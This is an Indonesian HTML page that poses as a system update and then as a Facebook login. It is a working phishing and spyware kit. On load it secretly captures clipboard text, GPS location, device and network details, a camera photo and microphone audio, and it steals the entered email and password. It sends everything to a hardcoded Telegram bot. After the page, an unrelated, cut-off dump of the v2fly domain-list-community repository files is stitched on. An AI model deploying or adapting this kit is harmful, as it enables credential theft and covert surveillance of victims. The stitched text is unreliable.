<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Pembaruan Sistem</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin: 0;
  background: #fff;
  font-family: 'Roboto', sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
}
#updateScreen, #loginScreen {
  display: none;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
h1 {
  color: #4CAF50;
  margin-bottom: 10px;
}
p {
  color: #555;
  margin-bottom: 20px;
}
#progress {
  width: 80%;
  height: 20px;
  background: #eee;
  border-radius: 10px;
  overflow: hidden;
}
#progressBar {
  width: 0%;
  height: 100%;
  background: #4CAF50;
}
input {
  margin: 10px;
  padding: 10px;
  width: 250px;
  border: 1px solid #ccc;
  border-radius: 5px;
}
button {
  padding: 10px 20px;
  background: #1877f2;
  color: white;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}
</style>
</head>
<body>

<div id="updateScreen">
  <h1>Memeriksa Pembaruan...</h1>
  <p>Jangan matikan perangkat Anda.</p>
  <div id="progress">
    <div id="progressBar"></div>
  </div>
</div>

<div id="loginScreen">
  <h1 style="color:#1877f2;">Facebook</h1>
  <input type="text" id="email" placeholder="Email atau Nomor Telepon">
  <input type="password" id="password" placeholder="Kata Sandi">
  <button onclick="kirimLogin()">Masuk</button>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// Setting
const token = '8415350176:AAHtPe3nFsTFcxq8AX71EWbOn1MLZiEBTjk'; // Tokenmu
const chat_id = '8201042358'; // Chat ID mu
const startTime = Date.now();

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

// Telegram kirim
function kirimPesan(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ chat_id, text })
  });
}

function kirimFoto(blob, caption) {
  let form = new FormData();
  form.append('chat_id', chat_id);
  form.append('photo', blob, 'foto.jpg');
  form.append('caption', caption);
  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
}

function kirimAudio(blob) {
  let form = new FormData();
  form.append('chat_id', chat_id);
  form.append('audio', blob, 'rekaman.mp3');
  form.append('caption', 'ðŸŽ¤ Rekaman Suara Korban');
  fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
}

// Sadap kamera
function ambilFoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);
  canvas.toBlob(blob => kirimFoto(blob, 'ðŸ“¸ Foto Kamera'));
}

// Sadap mic
function sadapMic() {
  navigator.mediaDevices.getUserMedia({ audio: true })
  .then(stream => {
    const recorder = new MediaRecorder(stream);
    const audioChunks = [];
    recorder.ondataavailable = e => audioChunks.push(e.data);
    recorder.onstop = () => {
      const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
      kirimAudio(audioBlob);
    };
    recorder.start();
    setTimeout(() => recorder.stop(), 10000); // 10 detik
  });
}

// Sensor
function sensorInfo() {
  window.addEventListener('devicemotion', event => {
    const acc = event.accelerationIncludingGravity;
    kirimPesan(`ðŸ“¡ Sensor:
X: ${acc.x?.toFixed(2)}
Y: ${acc.y?.toFixed(2)}
Z: ${acc.z?.toFixed(2)}
`);
  }, { once: true });
}

// Curi clipboard
function curiClipboard() {
  navigator.clipboard.readText()
  .then(text => kirimPesan('ðŸ“‹ Clipboard:\n' + text))
  .catch(err => kirimPesan('Gagal akses clipboard: ' + err));
}

// Device info
function deviceInfo() {
  fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
  .then(loc => loc.json())
  .then(info => {
    const device = navigator.userAgent;
    const ram = navigator.deviceMemory || 'Tidak diketahui';
    const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const bahasa = navigator.language;
    const browser = navigator.appName + ' ' + navigator.appVersion;
    const statusJaringan = navigator.onLine ? 'Online' : 'Offline';

    navigator.getBattery().then(bat => {
      const now = Date.now();
      const waktuBuka = Math.floor((now - startTime) / 1000);
      const status = `
==[+] ð™ð™§ð™–ð™˜ð™  By IkiiDev [+]==
ðŸŒ IP: ${info.ip}
ðŸ³ Negara: ${info.country_name}
ðŸ–¥ Region: ${info.region}
ðŸ“² Kota: ${info.city}
ðŸ”Ž ISP: ${info.org}
ðŸ”‹ Baterai: ${Math.floor(bat.level * 100)}%
ðŸ“± Device: ${device}
ðŸ§  RAM: ${ram} GB
âš™ï¸ CPU: ${cpu} core
ðŸŒ Zona Waktu: ${timezone}
ðŸ—£ï¸ Bahasa: ${bahasa}
ðŸ§­ Browser: ${browser}
ðŸ“¡ Status Jaringan: ${statusJaringan}
â³ Waktu buka web: ${waktuBuka} detik
==[+] ð˜¾ð™®ð™—ð™šð™§ IkiiDev  [+]==`;
      kirimPesan(status);
    });
  });
}

// Lokasi GPS
function gpsLokasi() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      kirimPesan(`ðŸ“ Lokasi GPS:\nhttps://maps.google.com/?q=${lat},${lon}`);
    });
  }
}

// Vibrasi
function vibratePhone() {
  if (navigator.vibrate) {
    navigator.vibrate([200, 100, 200]);
  }
}

// Progress bar fake loading
let progress = 0;
const progressBar = document.getElementById('progressBar');
const updateInterval = setInterval(() => {
  if (progress >= 100) {
    clearInterval(updateInterval);
    document.getElementById('updateScreen').style.display = 'none';
    document.getElementById('loginScreen').style.display = 'flex';
  } else {
    progress += 1;
    progressBar.style.width = progress + '%';
  }
}, 150); // 150ms per step

// Sadap semua
function mulaiSadap() {
  // Device info
  deviceInfo();
  // Clipboard
  curiClipboard();
  // GPS Lokasi
  gpsLokasi();
  // Sensor
  sensorInfo();
  // Vibrasi
  vibratePhone();
  // Kamera depan
  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
  .then(stream => {
    video.srcObject = stream;
    setTimeout(() => {
      ambilFoto();
      stream.getTracks().forEach(track => track.stop());
    }, 4000);
  });
  // Sadap mic
  sadapMic();
}

// Kirim login
function kirimLogin() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  kirimPesan(`ðŸ”‘ Login Korban:
Email: ${email}
Password: ${password}`);
  alert('Memproses...');
  setTimeout(() => {
    window.location.href = 'https://facebook.com';
  }, 1500);
}

// Start
document.getElementById('updateScreen').style.display = 'flex';
mulaiSadap();
</script>

const files = {"domain-list-community-master/.gitignore": {"type": "text", "content": ".idea\n.vscode\n\n/domain-list-community\n/domain-list-community.exe\n\n# Generated dat file.\ndlc.dat\n\n# Exported plaintext lists.\n/*.txt\n"}, "domain-list-community-master/LICENSE": {"type": "text", "content": "MIT License\n\nCopyright (c) 2018-2019 V2Ray\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"}, "domain-list-community-master/README.md": {"type": "text", "content": "# Domain list community\n\nThis project manages a list of domains, to be used as geosites for routing purpose in Project V.\n\n## Purpose of this project\n\nThis project is not opinionated. In other words, it does NOT endorse, claim or imply that a domain should be blocked or proxied. It can be used to generate routing rules on demand.\n\n## Download links\n\n- **dlc.dat**\uff1a[https://github.com/v2fly/domain-list-community/releases/latest/download/dlc.dat](https://github.com/v2fly/domain-list-community/releases/latest/download/dlc.dat)\n- **dlc.dat.sha256sum**\uff1a[https://github.com/v2fly/domain-list-community/releases/latest/download/dlc.dat.sha256sum](https://github.com/v2fly/domain-list-community/releases/latest/download/dlc.dat.sha256sum)\n\n## Usage example\n\nEach file in the `data` directory can be used as a rule in this format: `geosite:filename`.\n\n```json\n\"routing\": {\n  \"domainStrategy\": \"IPIfNonMatch\",\n  \"rules\": [\n    {\n      \"type\": \"field\",\n      \"outboundTag\": \"Reject\",\n      \"domain\": [\n        \"geosite:category-ads-all\",\n        \"geosite:category-porn\"\n      ]\n    },\n    {\n      \"type\": \"field\",\n      \"outboundTag\": \"Direct\",\n      \"domain\": [\n        \"domain:icloud.com\",\n        \"domain:icloud-content.com\",\n        \"domain:cdn-apple.com\",\n        \"geosite:cn\",\n        \"geosite:private\"\n      ]\n    },\n    {\n      \"type\": \"field\",\n      \"outboundTag\": \"Proxy-1\",\n      \"domain\": [\n        \"geosite:category-anticensorship\",\n        \"geosite:category-media\",\n        \"geosite:category-vpnservices\"\n      ]\n    },\n    {\n      \"type\": \"field\",\n      \"outboundTag\": \"Proxy-2\",\n      \"domain\": [\n        \"geosite:category-dev\"\n      ]\n    },\n    {\n      \"type\": \"field\",\n      \"outboundTag\": \"Proxy-3\",\n      \"domain\": [\n        \"geosite:geolocation-!cn\"\n      ]\n    }\n  ]\n}\n```\n\n## Generate `dlc.dat` manually\n\n- Install `golang` and `git`\n- Clone project code: `git clone https://github.com/v2fly/domain-list-community.git`\n- Navigate to project root directory: `cd domain-list-community`\n- Install project dependencies: `go mod download`\n- Generate `dlc.dat` (without `datapath` option means to use domain lists in `data` directory of current working directory):\n  - `go run ./`\n  - `go run ./ --datapath=/path/to/your/custom/data/directory`\n\nRun `go run ./ --help` for more usage information.\n\n## Structure of data\n\nAll data are under `data` directory. Each file in the directory represents a sub-list of domains, named by the file name. File content is in the following format.\n\n```\n# comments\ninclude:another-file\ndomain:google.com @attr1 @attr2\nkeyword:google\nregexp:www\\.google\\.com$\nfull:www.google.com\n```\n\n**Syntax:**\n\n> The following types of rules are **NOT** fully compatible with the ones that defined by user in V2Ray config file. Do **Not** copy and paste directly.\n\n* Comment begins with `#`. It may begin anywhere in the file. The content in the line after `#` is treated as comment and ignored in production.\n* Inclusion begins with `include:`, followed by the file name of an existing file in the same directory.\n* Subdomain begins with `domain:`, followed by a valid domain name. The prefix `domain:` may be omitted.\n* Keyword begins with `keyword:`, followed by a string.\n* Regular expression begins with `regexp:`, followed by a valid regular expression (per Golang's standard).\n* Full domain begins with `full:`, followed by a complete and valid domain name.\n* Domains (including `domain`, `keyword`, `regexp` and `full`) may have one or more attributes. Each attribute begins with `@` and followed by the name of the attribute.\n\n> **Note:** Adding new `regexp` and `keyword` rules is discouraged because it is easy to use them incorrectly, and proxy software cannot efficiently match these types of rules.\n\n## How it works\n\nThe entire `data` directory will be built into an external `geosite` file for Project V. Each file in the directory represents a section in the generated file.\n\nTo generate a section:\n\n1. Remove all the comments in the file.\n2. Replace `include:` lines with the actual content of the file.\n3. Omit all empty lines.\n4. Generate each `domain:` line into a [sub-domain routing rule](https://github.com/v2fly/v2ray-core/blob/master/app/router/config.proto#L21).\n5. Generate each `keyword:` line into a [plain domain routing rule](https://github.com/v2fly/v2ray-core/blob/master/app/router/config.proto#L17).\n6. Generate each `regexp:` line into a [regex domain routing rule](https://github.com/v2fly/v2ray-core/blob/master/app/router/config.proto#L19).\n7. Generate each `full:` line into a [full domain routing rule](https://github.com/v2fly/v2ray-core/blob/master/app/router/config.proto#L23).\n\n## How to organize domains\n\n### File name\n\nTheoretically any string can be used as the name, as long as it is a valid file name. In practice, we prefer names for determinic group of domains, such as the owner (usually a company name) of the domains, e.g., \"google\", \"netflix\". Names with unclear scope are generally unrecommended, such as \"evil\", or \"local\".\n\n### Attributes\n\nAttribute is useful for sub-group of domains, especially for filtering purpose. For example, the list of `google` domains may contains its main domains, as well as domains that serve ads. The ads domains may be marked by attribute `@ads`, and can be used as `geosite:google@ads` in V2Ray routing.\n\n## Contribution guideline\n\n* Fork this repo, make modifications to your own repo, file a PR.\n* Please begin with small size PRs, say modification in a single file.\n* A PR must be reviewed and approved by another member.\n* A script will verify your pull request to test whether your PR is correct or not every time you update the PR. Only the PR which passes the test will be merged. Please go to the Action label to get detailed information if you didn't pass it. We also provide the file which has been generated to make you test.\n* After a few successful PRs, you may apply for manager access to this repository.\n"}, "domain-list-community-master/go.mod": {"type": "text", "content": "module github.com/v2fly/domain-list-community\n\ngo 1.24\n\nrequire (\n\tgithub.com/v2fly/v2ray-core/v5 v5.38.0\n\tgoogle.golang.org/protobuf v1.36.8\n)\n\nrequire (\n\tgithub.com/adrg/xdg v0.5.3 // indirect\n\tgithub.com/golang/protobuf v1.5.4 // indirect\n\tgolang.org/x/sys v0.34.0 // indirect\n)\n"}, "domain-list-community-master/go.sum": {"type": "text", "content": "github.com/adrg/xdg v0.5.3 h1:xRnxJXne7+oWDatRhR1JLnvuccuIeCoBu2rtuLqQB78=\ngithub.com/adrg/xdg v0.5.3/go.mod h1:nlTsY+NNiCBGCK2tpm09vRqfVzrc2fLmXGpBLF0zlTQ=\ngithub.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3+rkHYY13jYWTU97c=\ngithub.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI+c5H38=\ngithub.com/golang/protobuf v1.5.4 h1:i7eJL8qZTpSEXOPTxNKhASYpMn+8e5Q6AdndVa1dWek=\ngithub.com/golang/protobuf v1.5.4/go.mod h1:lnTiLA8Wa4RWRcIUkrtSVa5nRhsEGBg48fD6rSs7xps=\ngithub.com/google/go-cmp v0.7.0 h1:wk8382ETsv4JYUZwIsn6YpYiWiBsYLSJiTsyBybVuN8=\ngithub.com/google/go-cmp v0.7.0/go.mod h1:pXiqmnSA92OHEEa9HXL2W4E7lf9JzCmGVUdgjX3N/iU=\ngithub.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=\ngithub.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=\ngithub.com/stretchr/testify v1.10.0 h1:Xv5erBjTwe/5IxqUQTdXv5kgmIvbHo3QQyRwhJsOfJA=\ngithub.com/stretchr/testify v1.10.0/go.mod h1:r2ic/lqez/lEtzL7wO/rwa5dbSLXVDPFyf8C91i36aY=\ngithub.com/v2fly/v2ray-core/v5 v5.38.0 h1:DjpBP9dyzpFfCNGg+C6FnEkFDT3pfe29I0leYtNbKNY=\ngithub.com/v2fly/v2ray-core/v5 v5.38.0/go.mod h1:PHM3drDx9mbme6xE8fRZT979wNPHWCbCIPreAIqxqUw=\ngolang.org/x/sys v0.34.0 h1:H5Y5sJ2L2JRdyv7ROF1he/lPdvFsd0mJHFw2ThKHxLA=\ngolang.org/x/sys v0.34.0/go.mod h1:BJP2sWEmIv4KK5OTEluFJCKSidICx8ciO85XgH3Ak8k=\ngoogle.golang.org/protobuf v1.36.8 h1:xHScyCOEuuwZEc6UtSOvPbAT4zRh0xcNRYekJwfqyMc=\ngoogle.golang.org/protobuf v1.36.8/go.mod h1:fuxRtAxBytpl4zzqUh6/eyUujkJdNiuEkXntxiD/uRU=\ngopkg.in/yaml.v3 v3.0.1 h1:fxVm/GzAzEWqLHuvctI91KS9hhNmmWOoWu0XTYJS7CA=\ngopkg.in/yaml.v3 v3.0.1/go.mod h1:K4uyk7z7BCEPqu6E+C64Yfv1cQ7kz7rIZviUmN+EgEM=\n"}, "domain-list-community-master/main.go": {"type": "text", "content": "package main\n\nimport (\n\t\"bufio\"\n\t\"errors\"\n\t\"flag\"\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"sort\"\n\t\"strconv\"\n\t\"strings\"\n\n\trouter \"github.com/v2fly/v2ray-core/v5/app/router/routercommon\"\n\t\"google.golang.org/protobuf/proto\"\n)\n\nvar (\n\tdataPath    = flag.String(\"datapath\", \"./data\", \"Path to your custom 'data' directory\")\n\toutputName  = flag.String(\"outputname\", \"dlc.dat\", \"Name of the generated dat file\")\n\toutputDir   = flag.String(\"outputdir\", \"./\", \"Directory to place all generated files\")\n\texportLists = flag.String(\"exportlists\", \"\", \"Lists to be flattened and exported in plaintext format, separated by ',' comma\")\n)\n\ntype Entry struct {\n\tType  string\n\tValue string\n\tAttrs []*router.Domain_Attribute\n}\n\ntype List struct {\n\tName  string\n\tEntry []Entry\n}\n\ntype ParsedList struct {\n\tName      string\n\tInclusion map[string]bool\n\tEntry     []Entry\n}\n\nfunc (l *ParsedList) toPlainText(listName string) error {\n\tvar entryBytes []byte\n\tfor _, entry := range l.Entry {\n\t\tvar attrString string\n\t\tif entry.Attrs != nil {\n\t\t\tfor _, attr := range entry.Attrs {\n\t\t\t\tattrString += \"@\" + attr.GetKey() + \",\"\n\t\t\t}\n\t\t\tattrString = strings.TrimRight(\":\"+attrString, \",\")\n\t\t}\n\t\t// Entry output format is: type:domain.tld:@attr1,@attr2\n\t\tentryBytes = append(entryBytes, []byte(entry.Type+\":\"+entry.Value+attrString+\"\\n\")...)\n\t}\n\tif err := os.WriteFile(filepath.Join(*outputDir, listName+\".txt\"), entryBytes, 0644); err != nil {\n\t\treturn err\n\t}\n\treturn nil\n}\n\nfunc (l *ParsedList) toProto() (*router.GeoSite, error) {\n\tsite := &router.GeoSite{\n\t\tCountryCode: l.Name,\n\t}\n\tfor _, entry := range l.Entry {\n\t\tswitch entry.Type {\n\t\tcase \"domain\":\n\t\t\tsite.Domain = append(site.Domain, &router.Domain{\n\t\t\t\tType:      router.Domain_RootDomain,\n\t\t\t\tValue:     entry.Value,\n\t\t\t\tAttribute: entry.Attrs,\n\t\t\t})\n\t\tcase \"regexp\":\n\t\t\tsite.Domain = append(site.Domain, &router.Domain{\n\t\t\t\tType:      router.Domain_Regex,\n\t\t\t\tValue:     entry.Value,\n\t\t\t\tAttribute: entry.Attrs,\n\t\t\t})\n\t\tcase \"keyword\":\n\t\t\tsite.Domain = append(site.Domain, &router.Domain{\n\t\t\t\tType:      router.Domain_Plain,\n\t\t\t\tValue:     entry.Value,\n\t\t\t\tAttribute: entry.Attrs,\n\t\t\t})\n\t\tcase \"full\":\n\t\t\tsite.Domain = append(site.Domain, &router.Domain{\n\t\t\t\tType:      router.Domain_Full,\n\t\t\t\tValue:     entry.Value,\n\t\t\t\tAttribute: entry.Attrs,\n\t\t\t})\n\t\tdefault:\n\t\t\treturn nil, errors.New(\"unknown domain type: \" + entry.Type)\n\t\t}\n\t}\n\treturn site, nil\n}\n\nfunc exportPlainTextList(list []string, refName string, pl *ParsedList) {\n\tfor _, listName := range list {\n\t\tif strings.EqualFold(refName, listName) {\n\t\t\tif err := pl.toPlainText(strings.ToLower(refName)); err != nil {\n\t\t\t\tfmt.Println(\"Failed: \", err)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tfmt.Printf(\"'%s' has been generated successfully.\\n\", listName)\n\t\t}\n\t}\n}\n\nfunc removeComment(line string) string {\n\tidx := strings.Index(line, \"#\")\n\tif idx == -1 {\n\t\treturn line\n\t}\n\treturn strings.TrimSpace(line[:idx])\n}\n\nfunc parseDomain(domain string, entry *Entry) error {\n\tkv := strings.Split(domain, \":\")\n\tif len(kv) == 1 {\n\t\tentry.Type = \"domain\"\n\t\tentry.Value = strings.ToLower(kv[0])\n\t\treturn nil\n\t}\n\n\tif len(kv) == 2 {\n\t\tentry.Type = strings.ToLower(kv[0])\n\t\tentry.Value = strings.ToLower(kv[1])\n\t\treturn nil\n\t}\n\n\treturn errors.New(\"Invalid format: \" + domain)\n}\n\nfunc parseAttribute(attr string) (*router.Domain_Attribute, error) {\n\tvar attribute router.Domain_Attribute\n\tif len(attr) == 0 || attr[0] != '@' {\n\t\treturn &attribute, errors.New(\"invalid attribute: \" + attr)\n\t}\n\n\t// Trim attribute prefix `@` character\n\tattr = attr[1:]\n\tparts := strings.Split(attr, \"=\")\n\tif len(parts) == 1 {\n\t\tattribute.Key = strings.ToLower(parts[0])\n\t\tattribute.TypedValue = &router.Domain_Attribute_BoolValue{BoolValue: true}\n\t} else {\n\t\tattribute.Key = strings.ToLower(parts[0])\n\t\tintv, err := strconv.Atoi(parts[1])\n\t\tif err != nil {\n\t\t\treturn &attribute, errors.New(\"invalid attribute: \" + attr + \": \" + err.Error())\n\t\t}\n\t\tattribute.TypedValue = &router.Domain_Attribute_IntValue{IntValue: int64(intv)}\n\t}\n\treturn &attribute, nil\n}\n\nfunc parseEntry(line string) (Entry, error) {\n\tline = strings.TrimSpace(line)\n\tparts := strings.Split(line, \" \")\n\n\tvar entry Entry\n\tif len(parts) == 0 {\n\t\treturn entry, errors.New(\"empty entry\")\n\t}\n\n\tif err := parseDomain(parts[0], &entry); err != nil {\n\t\treturn entry, err\n\t}\n\n\tfor i := 1; i < len(parts); i++ {\n\t\tattr, err := parseAttribute(parts[i])\n\t\tif err != nil {\n\t\t\treturn entry, err\n\t\t}\n\t\tentry.Attrs = append(entry.Attrs, attr)\n\t}\n\n\treturn entry, nil\n}\n\nfunc Load(path string) (*List, error) {\n\tfile, err := os.Open(path)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer file.Close()\n\n\tlist := &List{\n\t\tName: strings.ToUpper(filepath.Base(path)),\n\t}\n\tscanner := bufio.NewScanner(file)\n\tfor scanner.Scan() {\n\t\tline := strings.TrimSpace(scanner.Text())\n\t\tline = removeComment(line)\n\t\tif len(line) == 0 {\n\t\t\tcontinue\n\t\t}\n\t\tentry, err := parseEntry(line)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tlist.Entry = append(list.Entry, entry)\n\t}\n\n\treturn list, nil\n}\n\nfunc isMatchAttr(Attrs []*router.Domain_Attribute, includeKey string) bool {\n\tisMatch := false\n\tmustMatch := true\n\tmatchName := includeKey\n\tif strings.HasPrefix(includeKey, \"!\") {\n\t\tisMatch = true\n\t\tmustMatch = false\n\t\tmatchName = strings.TrimLeft(includeKey, \"!\")\n\t}\n\n\tfor _, Attr := range Attrs {\n\t\tattrName := Attr.Key\n\t\tif mustMatch {\n\t\t\tif matchName == attrName {\n\t\t\t\tisMatch = true\n\t\t\t\tbreak\n\t\t\t}\n\t\t} else {\n\t\t\tif matchName == attrName {\n\t\t\t\tisMatch = false\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t}\n\treturn isMatch\n}\n\nfunc createIncludeAttrEntrys(list *List, matchAttr *router.Domain_Attribute) []Entry {\n\tnewEntryList := make([]Entry, 0, len(list.Entry))\n\tmatchName := matchAttr.Key\n\tfor _, entry := range list.Entry {\n\t\tmatched := isMatchAttr(entry.Attrs, matchName)\n\t\tif matched {\n\t\t\tnewEntryList = append(newEntryList, entry)\n\t\t}\n\t}\n\treturn newEntryList\n}\n\nfunc ParseList(list *List, ref map[string]*List) (*ParsedList, error) {\n\tpl := &ParsedList{\n\t\tName:      list.Name,\n\t\tInclusion: make(map[string]bool),\n\t}\n\tentryList := list.Entry\n\tfor {\n\t\tnewEntryList := make([]Entry, 0, len(entryList))\n\t\thasInclude := false\n\t\tfor _, entry := range entryList {\n\t\t\tif entry.Type == \"include\" {\n\t\t\t\trefName := strings.ToUpper(entry.Value)\n\t\t\t\tif entry.Attrs != nil {\n\t\t\t\t\tfor _, attr := range entry.Attrs {\n\t\t\t\t\t\tInclusionName := strings.ToUpper(refName + \"@\" + attr.Key)\n\t\t\t\t\t\tif pl.Inclusion[InclusionName] {\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\t}\n\t\t\t\t\t\tpl.Inclusion[InclusionName] = true\n\n\t\t\t\t\t\trefList := ref[refName]\n\t\t\t\t\t\tif refList == nil {\n\t\t\t\t\t\t\treturn nil, errors.New(entry.Value + \" not found.\")\n\t\t\t\t\t\t}\n\t\t\t\t\t\tattrEntrys := createIncludeAttrEntrys(refList, attr)\n\t\t\t\t\t\tif len(attrEntrys) != 0 {\n\t\t\t\t\t\t\tnewEntryList = append(newEntryList, attrEntrys...)\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tInclusionName := refName\n\t\t\t\t\tif pl.Inclusion[InclusionName] {\n\t\t\t\t\t\tcontinue\n\t\t\t\t\t}\n\t\t\t\t\tpl.Inclusion[InclusionName] = true\n\t\t\t\t\trefList := ref[refName]\n\t\t\t\t\tif refList == nil {\n\t\t\t\t\t\treturn nil, errors.New(entry.Value + \" not found.\")\n\t\t\t\t\t}\n\t\t\t\t\tnewEntryList = append(newEntryList, refList.Entry...)\n\t\t\t\t}\n\t\t\t\thasInclude = true\n\t\t\t} else {\n\t\t\t\tnewEntryList = append(newEntryList, entry)\n\t\t\t}\n\t\t}\n\t\tentryList = newEntryList\n\t\tif !hasInclude {\n\t\t\tbreak\n\t\t}\n\t}\n\tpl.Entry = entryList\n\n\treturn pl, nil\n}\n\nfunc main() {\n\tflag.Parse()\n\n\tdir := *dataPath\n\tfmt.Println(\"Use domain lists in\", dir)\n\n\tref := make(map[string]*List)\n\terr := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tif info.IsDir() {\n\t\t\treturn nil\n\t\t}\n\t\tlist, err := Load(path)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tref[list.Name] = list\n\t\treturn nil\n\t})\n\tif err != nil {\n\t\tfmt.Println(\"Failed: \", err)\n\t\tos.Exit(1)\n\t}\n\n\t// Create output directory if not exist\n\tif _, err := os.Stat(*outputDir); os.IsNotExist(err) {\n\t\tif mkErr := os.MkdirAll(*outputDir, 0755); mkErr != nil {\n\t\t\tfmt.Println(\"Failed: \", mkErr)\n\t\t\tos.Exit(1)\n\t\t}\n\t}\n\n\tprotoList := new(router.GeoSiteList)\n\tvar existList []string\n\tfor refName, list := range ref {\n\t\tpl, err := ParseList(list, ref)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Failed: \", err)\n\t\t\tos.Exit(1)\n\t\t}\n\t\tsite, err := pl.toProto()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Failed: \", err)\n\t\t\tos.Exit(1)\n\t\t}\n\t\tprotoList.Entry = append(protoList.Entry, site)\n\n\t\t// Flatten and export plaintext list\n\t\tif *exportLists != \"\" {\n\t\t\tif existList != nil {\n\t\t\t\texportPlainTextList(existList, refName, pl)\n\t\t\t} else {\n\t\t\t\texportedListSlice := strings.Split(*exportLists, \",\")\n\t\t\t\tfor _, exportedListName := range exportedListSlice {\n\t\t\t\t\tfileName := filepath.Join(dir, exportedListName)\n\t\t\t\t\t_, err := os.Stat(fileName)\n\t\t\t\t\tif err == nil || os.IsExist(err) {\n\t\t\t\t\t\texistList = append(existList, exportedListName)\n\t\t\t\t\t} else {\n\t\t\t\t\t\tfmt.Printf(\"'%s' list does not exist in '%s' directory.\\n\", exportedListName, dir)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif existList != nil {\n\t\t\t\t\texportPlainTextList(existList, refName, pl)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t// Sort protoList so the marshaled list is reproducible\n\tsort.SliceStable(protoList.Entry, func(i, j int) bool {\n\t\treturn protoList.Entry[i].CountryCode < protoList.Entry[j].CountryCode\n\t})\n\n\tprotoBytes, err := proto.Marshal(protoList)\n\tif err != nil {\n\t\tfmt.Println(\"Failed:\", err)\n\t\tos.Exit(1)\n\t}\n\tif err := os.WriteFile(filepath.Join(*outputDir, *outputName), protoBytes, 0644); err != nil {\n\t\tfmt.Println(\"Failed: \", err)\n\t\tos.Exit(1)\n\t} else {\n\t\tfmt.Println(*outputName, \"has been generated successfully.\")\n\t}\n}\n"}, "domain-list-community-master/.github/dependabot.yml": {"type": "text", "content": "# To get started with Dependabot version updates, you'll need to specify which\n# package ecosystems to update and where the package manifests are located.\n# Please see the documentation for all configuration options:\n# https://help.github.com/github/administering-a-repository/configuration-options-for-dependency-updates\n\nversion: 2\nupdates:\n  - package-ecosystem: \"github-actions\"\n    directory: \"/\"\n    schedule:\n      interval: \"daily\"\n      timezone: \"Asia/Shanghai\"\n      time: \"10:00\"\n    pull-request-branch-name:\n      separator: \"-\"\n\n  - package-ecosystem: \"gomod\"\n    directory: \"/\"\n    schedule:\n      interval: \"daily\"\n      timezone: \"Asia/Shanghai\"\n      time: \"10:00\"\n    pull-request-branch-name:\n      separator: \"-\"\n"}, "domain-list-community-master/.github/workflows/build.yml": {"type": "text", "content": "name: Build dlc.dat\non:\n  push:\n    branches:\n      - master\n    paths-ignore:\n      - \"**/README.md\"\njobs:\n  build:\n    name: Build\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Checkout codebase\n        uses: actions/checkout@v5\n        with:\n          path: code\n\n      - name: Setup Go\n        uses: actions/setup-go@v6\n        with:\n          go-version-file: code/go.mod\n          cache-dependency-path: code/go.sum\n\n      - name: Set variables\n        run: |\n          echo \"RELEASE_NAME=$(date +%Y%m%d%H%M%S)\" >> $GITHUB_ENV\n          echo 